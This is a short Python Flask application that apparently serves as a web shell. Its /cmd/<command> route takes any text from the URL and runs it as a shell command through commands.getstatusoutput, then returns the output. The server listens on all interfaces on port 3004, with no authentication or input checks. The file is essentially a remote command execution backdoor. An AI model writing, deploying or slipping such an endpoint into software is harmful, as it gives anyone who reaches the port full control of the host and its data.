# -*- coding: utf-8 -*-

from flask import Flask
import commands
app = Flask(__name__)

@app.route('/')
def hello_world():
    return "welcome"

@app.route("/cmd/<command>")
def cmd(command):
    # result = os.system(command)
    status, output = commands.getstatusoutput(command)
    return output

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=3004)